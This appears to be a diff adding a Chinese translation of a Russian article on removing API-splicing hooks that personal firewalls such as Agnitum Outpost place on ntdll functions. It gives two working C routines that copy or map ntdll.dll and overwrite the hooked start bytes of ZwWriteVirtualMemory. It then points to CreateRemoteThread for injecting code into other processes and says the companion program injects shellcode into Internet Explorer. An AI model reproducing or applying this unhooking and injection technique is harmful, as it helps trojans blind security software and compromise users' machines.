@@ -1,0 +1,106 @@
+//原文章：俄罗斯程序员PSI_H的《Простой способ противодействия сплайсингу API》
+
+对付API-splicing的一种简单方法
+
+对于拦截API函数通常使用一种叫splicing的方法。此法的本质就是用JMP指令替换函数起始处的5个字节，将控制权传递给拦截程序。这种技术广泛应用于个人防火墙中，以防木马程序将自己的代码注入到其它可访问网络进程的地址空间中。然而，木马程序作者们可以采用不同的技术来穿透防火墙。比如说很流行的防火墙Agnitum Outpost的第三版就可以轻松绕过（详见MS-REM的文章《使用inject绕过防火墙》）。然而设计者们已经对自己的劳动结晶施以了巫术，Outpost 4.0已经能可靠地（？）对付这种方法了。但是如果这种保护绕不过去，那为什么不试着把它拿下呢？
+
+首先脑子里想到的是，使用LoadLibrary/GetProcAddress函数来获取被拦截函数的原始代码，之后用它在内存里替换掉以前的代码，这样就摘掉了对函数的HOOK。因为调用LoadLibrary将返回指向已加载模块的指针，所以必须将文件拷贝并加载此拷贝。下面的代码去除了对ZwWriteVirtualMemory函数的拦截：
+
+// 将NTDLL.DLL文件拷入TEMP文件夹
+
+char szTemp[MAX_PATH];
+
+GetTempPath(MAX_PATH, szTemp);
+
+strcat(szTemp, "ntdll2.dll");
+
+CopyFile("C:\\Windows\\System32\\ntdll.dll", szTemp, TRUE);
+
+// 取得指向原始函数的指针
+HMODULE hMod = LoadLibrary(szTemp);
+void* ptr_orig = GetProcAddress(hMod, "ZwWriteVirtualMemory"); 
+
+// 取得指向当前函数的指针
+void* ptr_new = GetProcAddress (LoadLibrary("ntdll.dll"), "ZwWriteVirtualMemory");
+
+// 设置内存访问权限
+DWORD dwOldProtect;
+VirtualProtect(ptr_new, 10, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+
+// 替换函数的前10个（为保险起见）字节
+memcpy(ptr_new, ptr_orig, 10);
+
+FreeLibrary(hMod);
+DeleteFile(szTemp);
+
+此后，为了在其它进程地址空间中执行自己的代码，可以使用经典的CreateRemoteThread。顺便说一句，Outpost对这个函数也进行了拦截，但是，在别的进程里创建线程是绝对可以的。
+
+尽管这里给出的摘除HOOK的方法完全奏效，但需要加载新的dll模块，这可能会引起防火墙的暴怒。我所认为的更为优雅的办法就是只需从文件中读取所需要的字节。下面这个函数的代码恢复了API的原始的起始部分。
+
+bool RemoveFWHook(char* szDllPath, char* szFuncName) // szDllPath为DLL的完整路径 !
+{
+// 取得指向函数的指针
+HMODULE lpBase = LoadLibrary(szDllPath);
+LPVOID lpFunc = GetProcAddress(lpBase, szFuncName);
+if(!lpFunc)
+return false;
+// 取得RVA
+DWORD dwRVA = (DWORD)lpFunc-(DWORD)lpBase;
+
+// 将文件映射入内存
+HANDLE hFile = CreateFile(szDllPath,GENERIC_READ, FILE_SHARE_READ,
+NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);
+if(INVALID_HANDLE_VALUE == hFile)
+return false;
+
+DWORD dwSize = GetFileSize(hFile, NULL);
+
+HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READONLY|SEC_IMAGE, 0, dwSize, NULL);
+
+LPVOID lpBaseMap = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, dwSize);
+
+// 指向当前函数的指针
+LPVOID lpRealFunc = (LPVOID)((DWORD)lpBaseMap+dwRVA);
+
+// 修改访问权限并拷贝
+DWORD dwOldProtect;
+BOOL bRes=true;
+if(VirtualProtect(lpFunc, 10, PAGE_EXECUTE_READWRITE, &dwOldProtect))
+{
+memcpy(lpFunc, lpRealFunc, 10);
+}else{
+bRes=false;
+}
+
+UnmapViewOfFile(lpBaseMap);
+
+CloseHandle(hMapFile);
+CloseHandle(hFile);
+
+return bRes;
+
+}
+
+注意CreateFileMapping函数的调用，参数SEC_IMAGE指明了文件将作为可执行文件映射入内存，这就使我们能够找到PE首部并计算文件偏移量。然而，以上示例是有缺陷的——用户可以禁止读取系统文件，除此之外，软件设计者还可以patch磁盘文件（尽管可能性很小）。对付的方法还是有的，可以基址作为标志函数起始的label。例如，在所有我研究过的Windows XP（SP0-SP2、RU和MUI）里，ZwWriteVirtualMemory起始处都是字节：
+
+B8 15 01 00 00 
+
+其对应的汇编助记符为
+
+mov eax, 00000115
+
+为了识别label，无需在磁盘文件上做手脚，因为ntdll.dll在distribution里是不设防的。当然使用静态label并不能保证相容性，但这是防范拦截的最好办法。
+
+使用上面所讲的技术可以达到十分通用的效果——比如防范调试器。比如说，我们的应用程序从注册表读取lisense键值，而且我们不想此举被黑客监视。为了恢复函数的原始代码以处理注册表，我们将断点（opcode为0xCC）做掉。老实说，如果黑客在函数的尾部施此伎俩，而我们只恢复起始部分，这还真就不灵了。所以，最好一下恢复整个code section。
+
+
+Anti-anti-splicing
+
+要想对付类似的anti－splicing的方法，developers可以对ZwProtectVirtualMemory函数进行处理。拦截了这个函数就能控制对内存访问参数的修改，我们也就因此而不能向所需的地址里进行写入。然而，如果建立了前面提到的函数起始基址的话，还是有办法对付的。
+
+本文的配套程序是向Internet Explorer注入shellcode的例子。
+
+[C] PSI_H
+
+董岩 译
+http://greatdong.blog.edu.cn
